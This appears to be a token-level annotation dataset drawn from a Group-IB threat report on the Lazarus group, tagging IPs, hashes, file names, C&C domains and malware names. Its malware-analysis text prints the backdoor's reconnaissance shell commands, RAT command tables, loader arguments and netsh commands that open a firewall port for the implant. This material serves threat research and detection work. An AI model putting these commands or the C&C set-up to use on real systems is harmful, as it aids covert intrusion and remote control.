Group-IB_Lazarus,80.78.73.204,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,140.115.31.220,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,140.115.42.147,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,26b4162e29de9c4a64b4dfd93b72c6426bc9dc8e,ioc
Group-IB_Lazarus,"

finews.otzo.com/emailAddress=master@otzo.com

",O
Group-IB_Lazarus,2016-04-10,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,41.72.101.138,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,202.183.185.90,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,140.112.14.16,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,140.116.31.195,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,140.116.178.123,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,203.66.57.237,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,66.207.112.187,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,165.123.67.111,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,212.14.44.245,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,106.2.44.86,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,f1f7c47c154a3f95cbc41a3299ce80a45e566519,ioc
Group-IB_Lazarus,"

host.global.com/emailAddress=info@host.global.com

",O
Group-IB_Lazarus,2016-03-21,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,69.196.83.206,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,175.45.61.44,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,57cfdf9b1e3a3675e5a971e1905f1ca5afd228bf,ioc
Group-IB_Lazarus,"

latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com

",O
Group-IB_Lazarus,2016-03-03,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,59.120.19.101,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,125.214.195.17,ioc
Group-IB_Lazarus,"

5.4  Certificates used  
to redirect traffic

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution24

Hash Malware type File names

",O
Group-IB_Lazarus,4cc10ab3f4ee6769e520694a10f611d5,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,SilverLight exploit,malware
Group-IB_Lazarus,  ,O
Group-IB_Lazarus,cambio.xap,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,6dffcfa68433f886b2e88fd984b4995a,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,1f2cd85583a4a56b764ba6429c2155ec,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Flash exploit,malware
Group-IB_Lazarus,  ,O
Group-IB_Lazarus,cambio.swf,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,cb52c013f7af0219d45953bae663c9a2,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,9216b29114fb6713ef228370cbfe4045,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Reconnaissance module,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,svchost.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,85d316590edfb4212049c4490db08c4b,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,1f7897b041a812f96f1925138ea38c46,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,1507e7a741367745425e0530e23768e6,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,MBLCTR.EXE,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,9914075cc687bdc352ee136ac6579707,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,fdsvc.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,9cc6854bc5e217104734043c89dc4ff8,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,fdsvc.dll,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,25200d3fe30785f3c90a91faf8ebf1b5,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,5994a8fd8c68dd1cc51ce7ca0d9c2749,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,889e320cf66520485e1a0475107d7419,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,40e698f961eb796728a57ddf81f52b9a,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,8e32fccd70cec634d13795bcb1da85ff,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,srservice.hlp,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,e29fe3c181ac9ddbb242688b151f3310,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,deskadp.dll,ioc
Group-IB_Lazarus," 
",O
Group-IB_Lazarus,srservice.dll,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,9216b29114fb6713ef228370cbfe4045,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,srservice.chm,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,570e6ea21cdce694a4a74876ca87534a,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,ejbss.dll,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,e4fb05a8c2da92ec5b19bdb59814464a,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,mbcrs.rll,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,f38f6d976e6d66abc86f9992e808670a,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,smtp.dat,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,3c3982d068bc7f2d1e4742c2009b0f46,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Server_TrafficForwarder,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,msvmgr.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,b603a16a950056df336fe3950c81601d,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,d032aeb54cf1229e011c070ecd64c33e,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Server_TrafficForwarder,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,msdtc.exe,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,5C1917F6753D03A08328132DB1E06571,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,BACKEND_LISTENER,malware
Group-IB_Lazarus, ,O
Group-IB_Lazarus,msdtc.exe,ioc
Group-IB_Lazarus,"

5.5  Malware



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution25

APPENDIX06

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," module

The ",O
Group-IB_Lazarus,svchost.exe,ioc
Group-IB_Lazarus, file (MD5 ,O
Group-IB_Lazarus,cb52c013f7af0219d45953bae663c9a2,ioc
Group-IB_Lazarus,", size 128512 
bytes) is a ",O
Group-IB_Lazarus,Backdoor,malware
Group-IB_Lazarus,". This program is installed and launched on the target 
machine through successful execution of exploits.

Once launched, the program adds itself to the auto-start by copying its file to the 
directory “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\
Programs\Startup”, collects information about the infected machine and sends it 
to the C&C server.

In addition, it can download and run third-party programs. The following 
commands are executed using a command interpreter:

«cmd.exe /c \»hostname > %s\»», &TempFileName);

«cmd.exe /c \»whoami >> %s\»», &TempFileName);

«cmd.exe /c \»ver >> %s\»», &TempFileName);

«cmd.exe /c \»ipconfig -all >> %s\»», &TempFileName);

«cmd.exe /c \»ping www.google.com >> %s\»», &TempFileName);

«cmd.exe /c \»query user >> %s\»», &TempFileName);

«cmd.exe /c \»net user >> %s\»», &TempFileName);

«cmd.exe /c \»net view >> %s\»», &TempFileName);

«cmd.exe /c \»net view /domain >> %s\»», &TempFileName);

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution26

exe /c \»reg query \»HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet 
Settings\» >> %s\»»,

«cmd.exe /c \»tasklist /svc >> %s\»», &TempFileName);

«cmd.exe /c \»netstat -ano | find \»TCP\» >> %s\»», &TempFileName);

}

The analyzed sample can download and run executable files on 
command from the C&C server (the ""http"" command). The ""killkill"" 
command, used for self-removal from the infected system, applies a 
hard-coded name of a .BAT file """,O
Group-IB_Lazarus,%temp%\tmp095j.bat,ioc
Group-IB_Lazarus,""". 

An example of a request to the C&C server is shown below:

GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1

Connection: Keep-Alive

User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 
Firefox/47.0

Host: www.eye-watch[.]in

Below is a code block with a command request sent to the C&C 
server:

Command Description

killkill Remove itself from the system

http Download and run the file from the C&C server



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution27

Below is a code block informing the C&C server about the results of 
file loading and execution commands:

Below is a code block informing the C&C server about the results of 
self-removal commands:

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution28

Below is a code block informing the C&C server about results of the 
data system collection command: 

This remote control tool is installed on command from ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus,", in the 
event the computer is of interest to the attacker. The application is 
deployed as follows: ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, -> ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, -> ,O
Group-IB_Lazarus,Payload,malware
Group-IB_Lazarus,".

The ",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus, file (MD5: ,O
Group-IB_Lazarus,1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae,ioc
Group-IB_Lazarus,", size: 
3449344 bytes) is an executable file and can be classified as ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,". 
This file is downloaded on the target system using ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus,". 

This console utility can be launched with the following arguments:

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

Arguments Description

",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus," -l Enumerates system services

",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus,"  -e [path] Extracts and decrypts the payload and saves it to the 
specified path

",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus," –a [service name] 
[path to DLL]

Installs the library as a service 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution29

The ",O
Group-IB_Lazarus,deskadp.dll,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,srservice.dll,ioc
Group-IB_Lazarus, files (MD5: ,O
Group-IB_Lazarus,e29fe3c181ac9ddbb242688b151f3310,ioc
Group-IB_Lazarus,", size: 79360 bytes) are executable dynamic libraries and 
can be classified as ",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,". These files are downloaded on the target 
system using ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," and can ensure its persistence in the system using 
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,".

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, is used to decrypt ,O
Group-IB_Lazarus,Payload,malware
Group-IB_Lazarus,". The encrypted file named 
",O
Group-IB_Lazarus,srservice.chm,ioc
Group-IB_Lazarus, (MD5: ,O
Group-IB_Lazarus,9216b29114fb6713ef228370cbfe4045,ioc
Group-IB_Lazarus,) is a ,O
Group-IB_Lazarus,RAT,malware
Group-IB_Lazarus,", 
which is saved (in encrypted form) to the directory “%windir%\Help\X.
chm”, where X is the name of the RAT file without an extension.

An additional file named ",O
Group-IB_Lazarus,srservice.hlp,ioc
Group-IB_Lazarus, (MD5: ,O
Group-IB_Lazarus,8e32fccd70cec634d13795bcb1da85ff,ioc
Group-IB_Lazarus,") is a RAT configuration file, which contains a C&C address 
embedded in an encrypted form.

The decrypted configuration file contains the following network 
addresses:

• ",O
Group-IB_Lazarus,tradeboard.mefound.com,ioc
Group-IB_Lazarus,":443

• ",O
Group-IB_Lazarus,movis-es.ignorelist.com,ioc
Group-IB_Lazarus,":443

In addition to configuration data, the file contains a built-in encrypted 
network address of the ",O
Group-IB_Lazarus,tradeboard.mefound.com,ioc
Group-IB_Lazarus,":443 node.

The strings are encrypted with a simple XOR operation of every 
subsequent 2 bytes with a constant 0x2CDF.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution30

Below is the buffer with the result of strings’ decryption.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution31

The application provides an option to specify the second network 
node, however it was not specified in the file identified and analyzed by 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists.

After its launch, ",O
Group-IB_Lazarus,srservice.dll,ioc
Group-IB_Lazarus," scans the % windir%\Help\ directory for a 
file with the same name, but with the .chm extension, then decrypts and 
injects it into the address space of the lsass.exe process.

Following this, the infected computer is controlled through a pre-
installed infrastructure with several layers of anonymization designed to 
complicate investigation.

The ",O
Group-IB_Lazarus,RAT,malware
Group-IB_Lazarus," contains usual commands in English. Communications with the 
C&C server are performed over an encrypted SSL channel as the ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," is compiled with statically linked libcurl libraries, version 7.47.1 (",O
Group-IB_Lazarus,FEB 2016,timestamp
Group-IB_Lazarus,").

This program may execute the following commands received from the 
C&C server: 

Command Description

NONE Do not execute any commands

GINF Collects and sends extensive system information about the PC

SLEP Do not execute any commands

HIBN Do not execute any commands

DRIV Get information about available disks in the system

DIRP List files with the specified extension

CHDR Changes the current directory

RUNX Get the user's token

MOVE Renames the specified file

FTIM Set the timestamps of the %windir%/system32/kernel32.dll file to the 
specified file

NEWF Create a new directory with the specified name

ZDWN Purportedly, downloads a file/files

PEIN Inject the code in the specified process

TCON Purportedly, it connects to the specified network node

DIR Enumerates files in the selected directory

DIE Remove itself from the system

DEL Delete the selected file

WIPE Delete the selected file and make it unrecoverable

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution32

Arguments Description

",O
Group-IB_Lazarus,dropper.exe,ioc
Group-IB_Lazarus," -x [key] -l Enumerates system services

",ioc
Group-IB_Lazarus,dropper.exe,ioc
Group-IB_Lazarus," -x [key] -e 
[servicename] [config]

Extracts and decrypts the payload from config and sets it as a service

",O
Group-IB_Lazarus,dropper.exe,ioc
Group-IB_Lazarus," -x [key] -f Installs implants by adding information about them to the system 
registry

",O
Group-IB_Lazarus,dropper.exe,ioc
Group-IB_Lazarus," -x [key] -o 
[eventname]

Calls OpenEventA with a special event name

",O
Group-IB_Lazarus,dropper.exe,ioc
Group-IB_Lazarus," -x [key] -t 
[eventname]

Calls OpenEventA with a special event name, then calls Setvent API

UPLD Upload the file to the C&C server

SCFG Get a new bot configuration

DRIV List the installed drivers

DOWN Download and run the file

CMDL Execute the command and upload the result of its operation to the C&C 
server

GCFG Download bot configuration

RUN Run the command

PVEW List running processes

PEEX Inject the code in the explorer.exe process.

PKIL Terminate the process with the selected PID

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,"

This program is designed to provide access to the local network and is also 
installed using the original ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,". The installation scheme is as follows: 
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, -> ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, -> ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, -> ,O
Group-IB_Lazarus,Payload,malware
Group-IB_Lazarus,".

The ",O
Group-IB_Lazarus,gpsvc.exe,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,MBLCTR.EXE,ioc
Group-IB_Lazarus," files (size: 753664 bytes, MD5: ",O
Group-IB_Lazarus,85d316590edfb4212049c4490db08c4b,ioc
Group-IB_Lazarus,) are executable files and can be classified as ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,". 
This file is installed on the target system using ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,", which is downloaded 
using ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus, or ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,".  

This console can be launched with the following arguments:

• Key means an encryption key. A MD5 hash (hashing algorithm) of this key is used to 
decrypt the configuration file.

• Config means a path to the configuration file that contains the name of the service, its 
description, and the loader of the main module, which will be installed on the system as 

a service.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution33

The program can also read executable data from the following registry keys 
and embed them into the selected process: 

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\
Security\Data2

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\
Security\Data3

",O
Group-IB_Lazarus,fdsvc.exe,ioc
Group-IB_Lazarus, (MD5 ,O
Group-IB_Lazarus,9914075cc687bdc352ee136ac6579707,ioc
Group-IB_Lazarus," and 60928 bytes) is an 
executable file and can be classified as ",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,".

Example of the ",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus," launch:

",O
Group-IB_Lazarus,loader.exe,ioc
Group-IB_Lazarus," -d ""encrypted_payload.bin"" -p 1540 -s 
[encrypted_C&C:port] -r [encrypted_commands]

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, is used to decrypt payload. The file named ,O
Group-IB_Lazarus,fdsvc.dll,ioc
Group-IB_Lazarus, (MD5: ,O
Group-IB_Lazarus,9cc6854bc5e217104734043c89dc4ff8,ioc
Group-IB_Lazarus,", size: 480768 bytes) is an encrypted 
payload which is ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus,".

After decryption, it becomes a simple DLL (MD5 ",O
Group-IB_Lazarus,25200d3fe30785f3c90a91faf8ebf1b5,ioc
Group-IB_Lazarus,", size: 519392 bytes) and is used to create a tunnel from 
the C&C server to the specified network resource. The payload provides 
a secure connection over a specially created protocol via a proxy server 
(an infected current host).

Description

The payload was compiled statically with the libcurl library, version 
7.49.1 (",O
Group-IB_Lazarus,"May 30, 2016",timestamp
Group-IB_Lazarus,"), LibTomMath, and the libgcrypt library to support 
encrypted TLS traffic.

 

Arguments Description

-d Name of the file for decryption

-p ID of the process in which the payload should be embedded

-r Encrypted param1

-s Encrypted param2

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution34

Some constants from the libgcrypt library are presented below:

After decoding arguments (the arguments that were passed to the second 
stage module), the payload gets an IP address and a port of the C&C server. 
The payload communicates with the C&C server using a specific encryption 
protocol at the application level. 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution35

If the remote host is specified, then the connection is performed to this node. 
As has been mentioned, the sample body contains several Russian words in 
transliteration:

""Nachalo"" is a debugging string that will be sent in encrypted format to the 
C&C server, indicating that a connection to the target node is established. 
When executing a thread, 5 attempts are made to connect to the C&C server 
directly. The program will shut down if the connection fails. In the event the 
connection is successful, the application receives commands from the C&C 
server and executes them. All commands and server responses are encrypted 
by default, but for your convenience, they are listed below in decrypted form.

The main purpose of connecting to the C&C server is to receive (or send) 
encrypted content from the server to the target machine. The connection 
to the C&C server is performed to the network address and port that are 
specified as command-line arguments when the sample is launched (by 
",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,").

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution36

Below is a list of available commands: 

By sending the ""ssylka"" message to the C&C server, the analyzed file can 
make the C&C server keep the connection open for further traffic redirection 
between the C&C server and Layer 1. The ""ssylka"" command is executed 
in the event the ""pereslat"" command is received from the C&C server. This 
means that the C&C server initiates the communication session by sending the 
«pereslat» command and waits for the incoming connection from the program 
(with the ""ssylka"" message) to further forward traffic between the C&C server 
and Layer 1 (communications are possible in both directions). The sample 
does not have a list of commands to forward traffic between the C&C server 
and Server2, it just redirects data from the one socket to another, when two 
connections are active.

One of the commands that can be received from the C&C server is 
«ustanavlivat». In the event the program receives it, it performs an additional 
request to the C&C server and receives a network address of the Server2 
node, which will be further used as an end point to proxy network traffic. 

The ""kliyent2podklyuchit"" message is intended to check the efficiency 
of an intermediate proxy server, through which network connections 
will be performed. If the target computer is specified in the command 
line, the sample will connect to this host with an additional message 
""kliyent2podklyuchit"". The connection is performed using the functionality of 
the statically linked library “libcurl”. In the event the connection is successful, 
traffic from the C&C server will further go through the proxy. If not, the 
application terminates its operation.

Command Description

ustanavlivat to receive a network address 
of the active Server2 server 
from the C&C server (the 
address will be sent in the next 
package)

poluchit to send a network address of 
the current Layer 2 server to 
the C&C server

pereslat to forward data between the 
C&C server and Server2

derzhat to keep the connection open

vykhodit to terminate the session

Command Description

Nachalo This message sent to the C&C 
server or the proxy during 
the start of the sample is the 
start-up indicator

kliyent2podklyuchit a testing proxy performance 
package

ssylka to connect to the С&C server 
to forward traffic between the 
C&C server and Server2

vykhodit notifying the C&C server of 
session termination

Commands from the C&C server Messages to the C&C server



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution37

The C&C server also may send the ""poluchit"" command. Once this command 
is received, the analyzed file will send a network address of the current server 
Server2 to the C&C server. 

The next possible command from the C&C server is ""pereslat"". Once this 
command is received, the file requests data from the C&C server and receives 
a certain X number. Following this, the sample will execute a multi-threaded 
C&C request with the ""ssylka"" command and forward traffic between the 
C&C server and Server2 nodes, when necessary. The number of threads for 
traffic redirection is equal to the X number that was previously obtained from 
the C&C server. If X> 1, then more than one equivalent tunnel is established 
simultaneously to redirect traffic from the C&C server to Server2 (the ""ssylka"" 
command).

""On top"" of the application protocol with encryption, application traffic is 
wrapped up inside ordinary TLS. ""Visible"" network traffic is a simple TLS 
connection. 

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 1C C0 13 C0 14 C0 27 C0 2F 
00 9E 00 6B 00 67 00 39 00 33 00 9C 00 3D 00 3C 00 35 00 2F 01 00 xx xx 00 
0A 00 08 00 06 xx xx xx xx xx xx

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 0E C0 13 C0 14 00 39 00 39 
00 33 00 35 00 2F 01 00

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 xx 00 00 05 FF 01 00 01 00

",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus,"

The ",O
Group-IB_Lazarus,ejbss.dll,ioc
Group-IB_Lazarus, library (MD5: ,O
Group-IB_Lazarus,570e6ea21cdce694a4a74876ca87534a,ioc
Group-IB_Lazarus,", size: 
226304 bytes) is classified as ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus,". 

Description

The file is a resident ",O
Group-IB_Lazarus,RAT,malware
Group-IB_Lazarus," application that, once launched, waits for 
incoming connections on a specific port to control the infected PC. The 
functions available for a remote operator include launching arbitrary 
commands, collecting data about the system, active PC sessions and 
running processes, deleting arbitrary files, reading data from the file, 
downloading and executing files.

The program is installed as a service (purportedly using ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,") and 
extracts the payload from itself. The scheme is similar to that that is used 
to infect client (target) machines.

Through examination of infected proxies, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists identified a 
service called rpcapt and a path to the program %WINDIR%\ejbss.dll.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution38

After startup, Payload is extracted and decrypted



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution39

The decrypted file is also a dynamic library containing a payload. 
After decryption, the file looks for exported funtion with ordinal #1 
and calls it.  

• On first run the application checks for the """,O
Group-IB_Lazarus,mbcrs.rll,ioc
Group-IB_Lazarus,""" file in the OS 
system directory. In the event the file exists, the app decrypts it and 
reads a port number from the file. This number will then be used 
for network communications. If the file does not exist, it is created 
and the port number generated in random fashion is added there in 
encrypted form. It is worth noting that ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists always 
observed port 3365 on the proxy.

• The file can use a port preconfigured by the attacker (and not a port 
with a random number), if the """,O
Group-IB_Lazarus,mbcrs.rll,ioc
Group-IB_Lazarus,""" file was copied with it during 
the ",O
Group-IB_Lazarus,RAT,malware
Group-IB_Lazarus," installation.

• For the network port that will be used for network communications, 
an rule is generated for the OS firewall. This action is performed by 
running one of the following commands:

netsh advfirewall firewall add rule name=CoreNetworkingHTTPS 
dir=in action=allow Protocol=TCP localport=%d

netsh firewall add portopening protocol=tcp port=%d 
name=CoreNetworkingHTTPS

where %d – the above-mentioned port number

• waits for incoming connections from the operator on the port, 
mentioned in the point above

• can execute commands as required by the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution40



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution41

• The table below contains a list of all commands available:

Command Description

OF Collects and sends the following system data to the operator: OS version, 
processor, computer name, information about network interfaces, information 
about mounted disks

OG Enumerates and sends data about existing disks in the system

OH Checks for certain files on the disk

OR Changes the current working directory

OI Enumerates and sends running processes

OJ Terminates the process with a specific name

OM Runs the command / file

ON Deletes a specific file

OO Writes data to a specific file

OP Sets the timestamps to a specific file that are the same as those of the system 
file shell32.dll 

OQ Executes the command and send its output

OU Create a file with specified content and set the file timestamp that is the same 
as the timestamp of shell32.dll

OT Reads the file contents and sends it to the operator

OS Searches for the specified file or directory, reads its contents and sends it to 
the operator

OV Gets and sends disk information

OW Modifies the file’s timestamp

OE Connect to a specific network node for traffic transmission

OX Reads, decrypts, and sends data from a file of the form “%windir%\system32\
hyrX.dll” in the system directory (where X is an arbitrary substring), 
purportedly containing the bot configuration

OY Writes data to a file in the system directory

OZ Gathers data about active sessions

OС Sends the ""0d"" command to the operator

OK Sends the ""0a"" command to the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution42

Server_TrafficForwarder

The ",O
Group-IB_Lazarus,msvmgr.exe,ioc
Group-IB_Lazarus, (MD5: ,O
Group-IB_Lazarus,3c3982d068bc7f2d1e4742c2009b0f46,ioc
Group-IB_Lazarus,", size: 
180224 bytes) and ",O
Group-IB_Lazarus,msdtc.exe,ioc
Group-IB_Lazarus, (MD5: ,O
Group-IB_Lazarus,b603a16a950056df336fe3950c81601d,ioc
Group-IB_Lazarus,", size: 348160 bytes, MD5: ",O
Group-IB_Lazarus,d032aeb54cf1229e011c070ecd64c33,ioc
